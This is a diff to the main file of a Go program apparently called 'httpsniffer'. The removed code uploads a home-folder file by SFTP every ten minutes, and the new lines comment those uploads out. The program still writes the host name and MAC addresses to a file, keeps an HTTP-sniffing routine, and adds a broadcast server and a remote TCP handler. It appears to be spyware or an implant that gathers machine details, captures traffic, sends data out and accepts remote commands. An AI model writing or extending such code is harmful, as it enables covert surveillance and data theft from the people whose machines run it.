@@ -9,6 +9,7 @@ import (
 	"httpsniffer/file"
 	"httpsniffer/hardware"
 	"httpsniffer/network"
+	"httpsniffer/tcp_handle"
 	"log"
 	"os"
 	"strings"
@@ -16,6 +17,7 @@ import (
 )
 
 var DEBUG int = 0
+var NETWORK_DEBUG = 1
 
 var homePath = os.Getenv("HOMEDRIVE")+os.Getenv("HOMEPATH")
 
@@ -98,13 +100,15 @@ func snifferHttp(){
 
 func main(){
 
-	go func() {
-		for {
-			network.UpLoadFile(homePath+"/1.txt")
-			fmt.Println("上传")
-			time.Sleep(time.Minute * 10)
-		}
-	}()
+	//sftp upload abandon
+	//go func() {
+	//	for {
+	//		network.UpLoadFile(homePath+"/1.txt")
+	//		fmt.Println("上传")
+	//		time.Sleep(time.Minute * 10)
+	//	}
+	//}()
+if NETWORK_DEBUG == 0 {
 
 	host := hardware.GetComName()
 	file.WriteWithOs(homePath+"/2.txt", host+"\r\n")
@@ -114,9 +118,31 @@ func main(){
 
 	macs := hardware.GetMacAddrs()
 	file.WriteWithOs(homePath+"/2.txt", "ips:"+macs+"\r\n")
+}
 
-	network.UpLoadFile(homePath+"/2.txt")
+	//sftp upload abandon
+	//network.UpLoadFile(homePath+"/2.txt")
 
-	snifferHttp()
+	c := make(chan int)
+	//启用广播服务
+	go func(){
+		network.BoardCastServer()
+	}()
+
+
+	//启用echo_server
+	go func(){
+		network.TcpRemote(tcp_handle.RemoteHandle)
+	}()
+
+
+	select {
+	case <- c:
+		return
+	}
+
+	if NETWORK_DEBUG == 0{
+		snifferHttp()
+	}
 }
 
